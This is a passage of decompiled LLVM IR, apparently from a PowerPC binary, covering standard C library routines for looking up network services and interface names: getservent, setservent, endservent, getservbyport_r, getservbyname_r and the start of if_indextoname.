  %v0_10024da8 = load i32, i32* @r28, align 4
  store i32 %v0_10024da8, i32* %r31.global-to-local, align 4
  store i32 268586416, i32* @lr, align 4
  %v1_10024dac = call i32 @atol(i32 %v0_10024d9c)
  %v0_10024db0 = load i32, i32* @r29, align 4
  %v1_10024db0 = load i32, i32* @r30, align 4
  %v2_10024db0 = add i32 %v1_10024db0, 12
  %v3_10024db0 = inttoptr i32 %v2_10024db0 to i32*
  store i32 %v0_10024db0, i32* %v3_10024db0, align 4
  %v1_10024db4 = urem i32 %v1_10024dac, 65536
  store i32 %v1_10024db4, i32* %r3.global-to-local, align 4
  %v0_10024db8 = load i32, i32* @r28, align 4
  %v1_10024db8 = load i32, i32* @r30, align 4
  %v2_10024db8 = add i32 %v1_10024db8, 4
  %v3_10024db8 = inttoptr i32 %v2_10024db8 to i32*
  store i32 %v0_10024db8, i32* %v3_10024db8, align 4
  %v0_10024dbc = load i32, i32* %r3.global-to-local, align 4
  %v1_10024dbc = load i32, i32* @r30, align 4
  %v2_10024dbc = add i32 %v1_10024dbc, 8
  %v3_10024dbc = inttoptr i32 %v2_10024dbc to i32*
  store i32 %v0_10024dbc, i32* %v3_10024dbc, align 4
  %v0_10024dc4 = load i32, i32* @r29, align 4
  store i32 %v0_10024dc4, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb30.1347 to i32), i32* @r4, align 4
  store i32 268586448, i32* @lr, align 4
  %v0_10024dcc = call i32 @__GI_strpbrk()
  store i32 %v0_10024dcc, i32* %r3.global-to-local, align 4
  store i32 %v0_10024dcc, i32* %r9.global-to-local, align 4
  %v4_10024dd0 = icmp eq i32 %v0_10024dcc, 0
  br i1 %v4_10024dd0, label %dec_label_pc_10024e20thread-pre-split, label %dec_label_pc_10024dd8

dec_label_pc_10024dd8:                            ; preds = %dec_label_pc_10024d98
  %v0_10024dd8 = load i32, i32* @r27, align 4
  %v1_10024dd8 = trunc i32 %v0_10024dd8 to i8
  %v3_10024dd8 = inttoptr i32 %v0_10024dcc to i8*
  store i8 %v1_10024dd8, i8* %v3_10024dd8, align 1
  br label %dec_label_pc_10024e1c

dec_label_pc_10024de0:                            ; preds = %dec_label_pc_10024e28
  %v3_10024e34 = icmp eq i8 %v2_10024e28, 32
  br i1 %v3_10024e34, label %dec_label_pc_10024e1c, label %dec_label_pc_10024de4

dec_label_pc_10024de4:                            ; preds = %dec_label_pc_10024de0
  %v0_10024de8 = load i32, i32* @r28, align 4
  store i32 %v0_10024e00, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb30.1347 to i32), i32* @r4, align 4
  %v0_10024df4 = load i32, i32* @r31, align 4
  br i1 %v3_10024e30, label %dec_label_pc_10024e1c, label %dec_label_pc_10024dfc

dec_label_pc_10024dfc:                            ; preds = %dec_label_pc_10024de4
  %v1_10024de8 = add i32 %v0_10024de8, 136
  %v2_10024df4 = icmp ult i32 %v0_10024df4, %v1_10024de8
  br i1 %v2_10024df4, label %dec_label_pc_10024e00, label %dec_label_pc_10024e08

dec_label_pc_10024e00:                            ; preds = %dec_label_pc_10024dfc
  %v2_10024e00 = inttoptr i32 %v0_10024df4 to i32*
  store i32 %v0_10024e00, i32* %v2_10024e00, align 4
  %v0_10024e04 = load i32, i32* @r31, align 4
  %v1_10024e04 = add i32 %v0_10024e04, 4
  store i32 %v1_10024e04, i32* @r31, align 4
  br label %dec_label_pc_10024e08

dec_label_pc_10024e08:                            ; preds = %dec_label_pc_10024dfc, %dec_label_pc_10024e00
  store i32 268586508, i32* @lr, align 4
  %v0_10024e08 = call i32 @__GI_strpbrk()
  store i32 %v0_10024e08, i32* %r3.global-to-local, align 4
  store i32 %v0_10024e08, i32* %r9.global-to-local, align 4
  %v4_10024e0c = icmp eq i32 %v0_10024e08, 0
  br i1 %v4_10024e0c, label %dec_label_pc_10024e20thread-pre-split, label %dec_label_pc_10024e14

dec_label_pc_10024e14:                            ; preds = %dec_label_pc_10024e08
  %v3_10024e18 = inttoptr i32 %v0_10024e08 to i8*
  store i8 0, i8* %v3_10024e18, align 1
  br label %dec_label_pc_10024e1c

dec_label_pc_10024e1c:                            ; preds = %dec_label_pc_10024de4, %dec_label_pc_10024de0, %dec_label_pc_10024dd8, %dec_label_pc_10024e14
  %v0_10024e1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10024e1c = add i32 %v0_10024e1c, 1
  store i32 %v1_10024e1c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10024e20

dec_label_pc_10024e20thread-pre-split:            ; preds = %dec_label_pc_10024d98, %dec_label_pc_10024e08
  br label %dec_label_pc_10024e20

dec_label_pc_10024e20:                            ; preds = %dec_label_pc_10024e20thread-pre-split, %dec_label_pc_10024e1c
  %v0_10024e00 = phi i32 [ 0, %dec_label_pc_10024e20thread-pre-split ], [ %v1_10024e1c, %dec_label_pc_10024e1c ]
  %v3_10024e20 = icmp eq i32 %v0_10024e00, 0
  br i1 %v3_10024e20, label %dec_label_pc_10024e3c, label %dec_label_pc_10024e28

dec_label_pc_10024e28:                            ; preds = %dec_label_pc_10024e20
  %v1_10024e28 = inttoptr i32 %v0_10024e00 to i8*
  %v2_10024e28 = load i8, i8* %v1_10024e28, align 1
  %v3_10024e2c = icmp eq i8 %v2_10024e28, 0
  %v3_10024e30 = icmp eq i8 %v2_10024e28, 9
  br i1 %v3_10024e2c, label %dec_label_pc_10024e3c, label %dec_label_pc_10024de0

dec_label_pc_10024e3c:                            ; preds = %dec_label_pc_10024e28, %dec_label_pc_10024e20
  %v1_10024e40 = load i32, i32* @r31, align 4
  %v2_10024e40 = inttoptr i32 %v1_10024e40 to i32*
  store i32 0, i32* %v2_10024e40, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v0_10024e48 = load i32, i32* @r30, align 4
  %v1_10024e48 = load i32, i32* @r26, align 4
  %v2_10024e48 = inttoptr i32 %v1_10024e48 to i32*
  store i32 %v0_10024e48, i32* %v2_10024e48, align 4
  br label %dec_label_pc_10024e4c

dec_label_pc_10024e4c:                            ; preds = %dec_label_pc_10024cf4, %dec_label_pc_10024e3c
  store i32 %v2_10024c88, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268586584, i32* @lr, align 4
  %v0_10024e54 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_10024e54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024e58

dec_label_pc_10024e58:                            ; preds = %dec_label_pc_10024c60, %dec_label_pc_10024e4c
  %v0_10024e5c = load i32, i32* @r31, align 4
  store i32 %v0_10024e5c, i32* %r3.global-to-local, align 4
  ret i32 %v0_10024e5c

; uselistorder directives
  uselistorder i8 %v2_10024e28, { 1, 2, 0 }
  uselistorder i32 %v0_10024e00, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10024d68, { 0, 2, 1 }
  uselistorder i32 %v0_10024d50, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10024d2c, { 1, 0, 2 }
  uselistorder i32 %v3_10024d0c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10024d0012, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2, 4, 5, 10, 11, 6, 7, 12, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 19, 13, 14, 15, 17, 16, 18, 1 }
  uselistorder i32 (i32)* @atol, { 64, 8, 7, 6, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 5, 4, 3, 2, 1, 0, 14, 13, 12, 11, 10, 9 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i8 32, { 1, 0, 3, 2, 4, 5, 8, 7, 9, 6, 12, 11, 10, 13, 14, 15, 16 }
  uselistorder i32 ()* @__GI_strpbrk, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 268586256, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10024e58, { 1, 0 }
  uselistorder label %dec_label_pc_10024e4c, { 1, 0 }
  uselistorder label %dec_label_pc_10024e20thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10024e1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10024e08, { 1, 0 }
  uselistorder label %dec_label_pc_10024d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10024cfc.backedge, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10024d18, { 1, 0 }
  uselistorder label %dec_label_pc_10024cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10024ce8, { 1, 0, 2 }
}

define i32 @getservent() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 268586624, i32* @lr, align 4
  %v0_10024e7c = call i32 @__initbuf()
  %v3_10024e88 = load i32, i32* @global_var_1004527c.1341, align 4
  %v2_10024e8c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268586652, i32* @lr, align 4
  %v5_10024e98 = call i32 @getservent_r(i32* nonnull @global_var_1004db48.1349, i32 %v3_10024e88, i32 4237, i32 %v2_10024e8c)
  %v3_10024ea0 = load i32, i32* %stack_var_-24, align 4
  ret i32 %v3_10024ea0
}

define i32 @__GI_endservent(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10024ec8 = ptrtoint i32* %stack_var_-40 to i32
  %v4_10024edc = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004506c.1342 to i32))
  store i32 268697600, i32* @r29, align 4
  store i32 268586732, i32* @lr, align 4
  %v1_10024ee8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004506c.1342 to i32))
  %v3_10024eec = load i32, i32* @global_var_10045280.1343, align 4
  %v3_10024ef0 = icmp eq i32 %v3_10024eec, 0
  br i1 %v3_10024ef0, label %dec_label_pc_10024f04, label %dec_label_pc_10024ef8

dec_label_pc_10024ef8:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10024efc.1350 to i32), i32* @lr, align 4
  %v1_10024ef8 = inttoptr i32 %v3_10024eec to i16*
  %v2_10024ef8 = call i32 @__GI_fclose(i16* %v1_10024ef8)
  store i32 0, i32* @global_var_10045280.1343, align 4
  br label %dec_label_pc_10024f04

dec_label_pc_10024f04:                            ; preds = %entry, %dec_label_pc_10024ef8
  store i32 %v2_10024ec8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @global_var_10045284.1351, align 4
  store i32 268586780, i32* @lr, align 4
  %v0_10024f18 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_10024f18

; uselistorder directives
  uselistorder label %dec_label_pc_10024f04, { 1, 0 }
}

define i32 @setservent(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10024f54 = ptrtoint i32* %stack_var_-40 to i32
  %v4_10024f5c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004506c.1342 to i32))
  store i32 268697600, i32* @r29, align 4
  store i32 268586860, i32* @lr, align 4
  %v1_10024f68 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004506c.1342 to i32))
  %v3_10024f6c = load i32, i32* @global_var_10045280.1343, align 4
  %v3_10024f7c = icmp eq i32 %v3_10024f6c, 0
  br i1 %v3_10024f7c, label %dec_label_pc_10024f88, label %dec_label_pc_10024f94

dec_label_pc_10024f88:                            ; preds = %entry
  store i32 268586892, i32* @lr, align 4
  %v3_10024f88 = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_1002fb18.1344 to i32), i32 ptrtoint (i32* @global_var_1002fb28.1345 to i32))
  store i32 %v3_10024f88, i32* @global_var_10045280.1343, align 4
  br label %dec_label_pc_10024f9c

dec_label_pc_10024f94:                            ; preds = %entry
  store i32 268586908, i32* @lr, align 4
  %v2_10024f98 = call i32 @__GI_rewind(i32 %v3_10024f6c, i32 ptrtoint (i32* @global_var_1002fb28.1345 to i32))
  br label %dec_label_pc_10024f9c

dec_label_pc_10024f9c:                            ; preds = %dec_label_pc_10024f88, %dec_label_pc_10024f94
  %v0_10024f9c = load i32, i32* @r31, align 4
  %v3_10024f9c = icmp eq i32 %v0_10024f9c, 0
  store i32 %v2_10024f54, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  br i1 %v3_10024f9c, label %dec_label_pc_10024fb8, label %dec_label_pc_10024fac

dec_label_pc_10024fac:                            ; preds = %dec_label_pc_10024f9c
  store i32 1, i32* @global_var_10045284.1351, align 4
  br label %dec_label_pc_10024fb8

dec_label_pc_10024fb8:                            ; preds = %dec_label_pc_10024f9c, %dec_label_pc_10024fac
  store i32 268586940, i32* @lr, align 4
  %v0_10024fb8 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_10024fb8

; uselistorder directives
  uselistorder i32* @global_var_10045280.1343, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_10024fb8, { 1, 0 }
  uselistorder label %dec_label_pc_10024f9c, { 1, 0 }
}

define i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg6 to i32
  store i32 %tmp, i32* @r8, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004506c.1342 to i32), i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* @r25, align 4
  %v2_10024ff4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg4, i32* @r26, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 %tmp, i32* @r28, align 4
  %v4_10025010 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004506c.1342 to i32))
  %v0_10025014 = load i32, i32* %r29.global-to-local, align 4
  store i32 268587036, i32* @lr, align 4
  %v1_10025018 = call i32 @pthread_mutex_lock(i32 %v0_10025014)
  %v3_10025020 = load i32, i32* @global_var_10045284.1351, align 4
  store i32 ptrtoint (i32* @global_var_10025028.1352 to i32), i32* @lr, align 4
  %v2_10025024 = call i32 @setservent(i32 %v3_10025020, i32 268697600)
  br label %dec_label_pc_1002504c

dec_label_pc_1002502c:                            ; preds = %dec_label_pc_1002504c
  %v0_1002502c = load i32, i32* @r31, align 4
  %v1_1002502c = add i32 %v0_1002502c, 8
  %v2_1002502c = inttoptr i32 %v1_1002502c to i32*
  %v3_1002502c = load i32, i32* %v2_1002502c, align 4
  %v1_10025030 = load i32, i32* @r25, align 4
  %v4_10025030 = icmp eq i32 %v3_1002502c, %v1_10025030
  br i1 %v4_10025030, label %dec_label_pc_10025038, label %dec_label_pc_1002504c

dec_label_pc_10025038:                            ; preds = %dec_label_pc_1002502c
  br i1 %v3_10025068, label %dec_label_pc_10025070, label %dec_label_pc_1002503c

dec_label_pc_1002503c:                            ; preds = %dec_label_pc_10025038
  %v1_1002503c = add i32 %v0_1002502c, 12
  %v2_1002503c = inttoptr i32 %v1_1002503c to i32*
  %v3_1002503c = load i32, i32* %v2_1002503c, align 4
  %v2_10025040 = inttoptr i32 %v3_1002503c to i8*
  %v3_10025040 = call i32 @__GI_strcoll(i8* %v2_10025040, i32 %v0_10025060)
  %v3_10025044 = icmp eq i32 %v3_10025040, 0
  br i1 %v3_10025044, label %dec_label_pc_10025070, label %dec_label_pc_1002504c

dec_label_pc_1002504c:                            ; preds = %dec_label_pc_1002502c, %dec_label_pc_1002503c, %entry
  %v0_1002504c = load i32, i32* @r26, align 4
  %v0_10025050 = load i32, i32* @r27, align 4
  %v0_10025054 = load i32, i32* @r28, align 4
  %v0_10025058 = load i32, i32* @r31, align 4
  store i32 268587104, i32* @lr, align 4
  %v4_1002505c = inttoptr i32 %v0_10025058 to i32*
  %v5_1002505c = call i32 @getservent_r(i32* %v4_1002505c, i32 %v0_1002504c, i32 %v0_10025050, i32 %v0_10025054)
  %v0_10025060 = load i32, i32* @r30, align 4
  store i32 %v0_10025060, i32* @r4, align 4
  store i32 %v5_1002505c, i32* @r29, align 4
  %v3_10025064 = icmp eq i32 %v5_1002505c, 0
  %v3_10025068 = icmp eq i32 %v0_10025060, 0
  br i1 %v3_10025064, label %dec_label_pc_1002502c, label %dec_label_pc_10025070

dec_label_pc_10025070:                            ; preds = %dec_label_pc_1002503c, %dec_label_pc_10025038, %dec_label_pc_1002504c
  %v3_10025074 = load i32, i32* @global_var_10045284.1351, align 4
  %v3_10025078 = icmp eq i32 %v3_10025074, 0
  br i1 %v3_10025078, label %dec_label_pc_10025080, label %dec_label_pc_10025084

dec_label_pc_10025080:                            ; preds = %dec_label_pc_10025070
  store i32 ptrtoint ([3 x i8]* @global_var_10025084.1353 to i32), i32* @lr, align 4
  %v1_10025080 = call i32 @__GI_endservent(i32 268697600)
  br label %dec_label_pc_10025084

dec_label_pc_10025084:                            ; preds = %dec_label_pc_10025070, %dec_label_pc_10025080
  store i32 %v2_10024ff4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268587152, i32* @lr, align 4
  %v0_1002508c = call i32 @__pthread_cleanup_pop_restore()
  %v0_10025090 = load i32, i32* @r28, align 4
  %v1_10025090 = inttoptr i32 %v0_10025090 to i32*
  %v2_10025090 = load i32, i32* %v1_10025090, align 4
  %v2_10025098 = icmp ne i32 %v2_10025090, 0
  %v0_100250a0 = load i32, i32* @r29, align 4
  %v2_100250a0 = select i1 %v2_10025098, i32 0, i32 %v0_100250a0
  ret i32 %v2_100250a0

; uselistorder directives
  uselistorder i32 %v0_10025060, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10025084, { 1, 0 }
  uselistorder label %dec_label_pc_10025070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002504c, { 1, 0, 2 }
}

define i32 @__GI_getservbyport(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268587216, i32* @lr, align 4
  %v0_100250cc = call i32 @__initbuf()
  %v3_100250d4 = load i32, i32* @global_var_1004527c.1341, align 4
  %v0_100250dc = load i32, i32* @r29, align 4
  %v0_100250e0 = load i32, i32* @r28, align 4
  store i32 268587252, i32* @lr, align 4
  %v8_100250f0 = call i32 @__GI_getservbyport_r(i32 %v0_100250dc, i32 %v0_100250e0, i32 ptrtoint (i32* @global_var_1004db48.1349 to i32), i32 %v3_100250d4, i32 4237, i32* nonnull %stack_var_-40, i32 268697600)
  %v3_100250f8 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_100250f8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @getservbyname_r(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004506c.1342 to i32), i32* %r29.global-to-local, align 4
  %v2_10025130 = ptrtoint i32* %stack_var_-56 to i32
  %v0_10025140 = load i32, i32* @r6, align 4
  store i32 %v0_10025140, i32* @r24, align 4
  %v0_10025144 = load i32, i32* @r7, align 4
  store i32 %v0_10025144, i32* @r25, align 4
  %v0_10025148 = load i32, i32* @r8, align 4
  store i32 %v0_10025148, i32* @r27, align 4
  %v4_1002514c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004506c.1342 to i32))
  %v0_10025150 = load i32, i32* %r29.global-to-local, align 4
  store i32 268587352, i32* @lr, align 4
  %v1_10025154 = call i32 @pthread_mutex_lock(i32 %v0_10025150)
  %v3_1002515c = load i32, i32* @global_var_10045284.1351, align 4
  store i32 ptrtoint (i32* @global_var_10025164.1354 to i32), i32* @lr, align 4
  %v2_10025160 = call i32 @setservent(i32 %v3_1002515c, i32 268697600)
  br label %dec_label_pc_100251c8

dec_label_pc_10025168:                            ; preds = %dec_label_pc_100251c8
  %v0_10025168 = load i32, i32* @r31, align 4
  %v1_10025168 = inttoptr i32 %v0_10025168 to i32*
  %v2_10025168 = load i32, i32* %v1_10025168, align 4
  store i32 %v2_10025168, i32* @r4, align 4
  %v0_1002516c = load i32, i32* @r28, align 4
  %v2_10025170 = inttoptr i32 %v0_1002516c to i8*
  %v3_10025170 = call i32 @__GI_strcoll(i8* %v2_10025170, i32 %v2_10025168)
  %v3_10025174 = icmp eq i32 %v3_10025170, 0
  br i1 %v3_10025174, label %dec_label_pc_100251ac, label %dec_label_pc_1002517c

dec_label_pc_1002517c:                            ; preds = %dec_label_pc_10025168
  %v0_1002517c = load i32, i32* @r31, align 4
  %v1_1002517c = add i32 %v0_1002517c, 4
  %v2_1002517c = inttoptr i32 %v1_1002517c to i32*
  %v3_1002517c = load i32, i32* %v2_1002517c, align 4
  store i32 %v3_1002517c, i32* %r29.global-to-local, align 4
  %v1_100251905 = inttoptr i32 %v3_1002517c to i32*
  %v2_100251906 = load i32, i32* %v1_100251905, align 4
  %v0_100251947 = load i32, i32* @r28, align 4
  %v1_100251988 = add i32 %v3_1002517c, 4
  store i32 %v1_100251988, i32* @r29, align 4
  %v3_1002519c11 = icmp eq i32 %v2_100251906, 0
  store i32 %v2_100251906, i32* @r4, align 4
  br i1 %v3_1002519c11, label %dec_label_pc_100251c8, label %dec_label_pc_10025184

dec_label_pc_10025184:                            ; preds = %dec_label_pc_1002517c, %dec_label_pc_10025184.dec_label_pc_10025190_crit_edge
  %v0_1002519413 = phi i32 [ %v0_10025194, %dec_label_pc_10025184.dec_label_pc_10025190_crit_edge ], [ %v0_100251947, %dec_label_pc_1002517c ]
  %v2_1002519012 = phi i32 [ %v2_10025190, %dec_label_pc_10025184.dec_label_pc_10025190_crit_edge ], [ %v2_100251906, %dec_label_pc_1002517c ]
  %v2_10025184 = inttoptr i32 %v0_1002519413 to i8*
  %v3_10025184 = call i32 @__GI_strcoll(i8* %v2_10025184, i32 %v2_1002519012)
  %v3_10025188 = icmp eq i32 %v3_10025184, 0
  br i1 %v3_10025188, label %dec_label_pc_100251ac, label %dec_label_pc_10025184.dec_label_pc_10025190_crit_edge

dec_label_pc_10025184.dec_label_pc_10025190_crit_edge: ; preds = %dec_label_pc_10025184
  %v0_10025190.pre = load i32, i32* @r29, align 4
  %v1_10025190 = inttoptr i32 %v0_10025190.pre to i32*
  %v2_10025190 = load i32, i32* %v1_10025190, align 4
  %v0_10025194 = load i32, i32* @r28, align 4
  %v1_10025198 = add i32 %v0_10025190.pre, 4
  store i32 %v1_10025198, i32* @r29, align 4
  %v3_1002519c = icmp eq i32 %v2_10025190, 0
  store i32 %v2_10025190, i32* @r4, align 4
  br i1 %v3_1002519c, label %dec_label_pc_100251c8, label %dec_label_pc_10025184

dec_label_pc_100251ac:                            ; preds = %dec_label_pc_10025184, %dec_label_pc_10025168
  %v0_100251ac = load i32, i32* @r30, align 4
  %v3_100251ac = icmp eq i32 %v0_100251ac, 0
  br i1 %v3_100251ac, label %dec_label_pc_100251e4, label %dec_label_pc_100251b4

dec_label_pc_100251b4:                            ; preds = %dec_label_pc_100251ac
  %v0_100251b4 = load i32, i32* @r31, align 4
  %v1_100251b4 = add i32 %v0_100251b4, 12
  %v2_100251b4 = inttoptr i32 %v1_100251b4 to i32*
  %v3_100251b4 = load i32, i32* %v2_100251b4, align 4
  store i32 %v0_100251ac, i32* @r4, align 4
  %v2_100251bc = inttoptr i32 %v3_100251b4 to i8*
  %v3_100251bc = call i32 @__GI_strcoll(i8* %v2_100251bc, i32 %v0_100251ac)
  %v3_100251c0 = icmp eq i32 %v3_100251bc, 0
  br i1 %v3_100251c0, label %dec_label_pc_100251e4, label %dec_label_pc_100251c8

dec_label_pc_100251c8:                            ; preds = %dec_label_pc_1002517c, %dec_label_pc_10025184.dec_label_pc_10025190_crit_edge, %dec_label_pc_100251b4, %entry
  %v0_100251c8 = load i32, i32* @r31, align 4
  %v0_100251cc = load i32, i32* @r24, align 4
  %v0_100251d0 = load i32, i32* @r25, align 4
  %v0_100251d4 = load i32, i32* @r27, align 4
  store i32 268587484, i32* @lr, align 4
  %v4_100251d8 = inttoptr i32 %v0_100251c8 to i32*
  %v5_100251d8 = call i32 @getservent_r(i32* %v4_100251d8, i32 %v0_100251cc, i32 %v0_100251d0, i32 %v0_100251d4)
  store i32 %v5_100251d8, i32* @r26, align 4
  %v3_100251dc = icmp eq i32 %v5_100251d8, 0
  br i1 %v3_100251dc, label %dec_label_pc_10025168, label %dec_label_pc_100251e4

dec_label_pc_100251e4:                            ; preds = %dec_label_pc_100251b4, %dec_label_pc_100251ac, %dec_label_pc_100251c8
  %v3_100251e8 = load i32, i32* @global_var_10045284.1351, align 4
  %v3_100251ec = icmp eq i32 %v3_100251e8, 0
  br i1 %v3_100251ec, label %dec_label_pc_100251f4, label %dec_label_pc_100251f8

dec_label_pc_100251f4:                            ; preds = %dec_label_pc_100251e4
  store i32 ptrtoint ([3 x i8]* @global_var_100251f8.1355 to i32), i32* @lr, align 4
  %v1_100251f4 = call i32 @__GI_endservent(i32 268697600)
  br label %dec_label_pc_100251f8

dec_label_pc_100251f8:                            ; preds = %dec_label_pc_100251e4, %dec_label_pc_100251f4
  store i32 %v2_10025130, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268587524, i32* @lr, align 4
  %v0_10025200 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10025204 = load i32, i32* @r27, align 4
  %v1_10025204 = inttoptr i32 %v0_10025204 to i32*
  %v2_10025204 = load i32, i32* %v1_10025204, align 4
  %v2_1002520c = icmp ne i32 %v2_10025204, 0
  %v0_10025214 = load i32, i32* @r26, align 4
  %v2_10025214 = select i1 %v2_1002520c, i32 0, i32 %v0_10025214
  ret i32 %v2_10025214

; uselistorder directives
  uselistorder i32 %v0_100251ac, { 1, 0, 2 }
  uselistorder i32 %v2_10025190, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI_endservent, { 1, 0 }
  uselistorder i32 (i32, i32)* @setservent, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1004506c.1342 to i32), { 2, 7, 3, 8, 0, 4, 1, 5, 6, 9 }
  uselistorder label %dec_label_pc_100251f8, { 1, 0 }
  uselistorder label %dec_label_pc_100251e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100251c8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10025184, { 1, 0 }
}

define i32 @getservbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268587588, i32* @lr, align 4
  %v0_10025240 = call i32 @__initbuf()
  %v3_10025248 = load i32, i32* @global_var_1004527c.1341, align 4
  store i32 %v3_10025248, i32* @r6, align 4
  %v0_10025250 = load i32, i32* @r29, align 4
  %v0_10025254 = load i32, i32* @r28, align 4
  store i32 %v0_10025254, i32* @r4, align 4
  %v2_10025258 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10025258, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1004db48.1349 to i32), i32* @r5, align 4
  store i32 4237, i32* @r7, align 4
  store i32 268587624, i32* @lr, align 4
  %v4_10025264 = call i32 @getservbyname_r(i32 %v0_10025250)
  %v3_1002526c = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1002526c

; uselistorder directives
  uselistorder i32 4237, { 2, 0, 1, 3 }
  uselistorder i32* @global_var_1004db48.1349, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1004db48.1349 to i32), { 1, 0 }
  uselistorder i32 ()* @__initbuf, { 2, 1, 0 }
}

define i32 @if_indextoname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10025280 = load i32, i32* @lr, align 4
  store i32 %v0_10025280, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268587676, i32* @lr, align 4
  %v0_10025298 = call i32 @__opensock()
  store i32 %v0_10025298, i32* @r3, align 4
  %v2_1002529c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v0_10025298, i32* @r29, align 4
  %v1_100252a0 = icmp slt i32 %v0_10025298, 0
  store i32 35088, i32* @r4, align 4
  store i32 %v2_1002529c, i32* @r5, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v1_100252a0, label %dec_label_pc_10025314, label %dec_label_pc_100252b8

dec_label_pc_100252b8:                            ; preds = %entry
  store i32 268587716, i32* @lr, align 4
  %v0_100252c0 = call i32 @ioctl()
  %tmp7 = icmp sgt i32 %v0_100252c0, -1
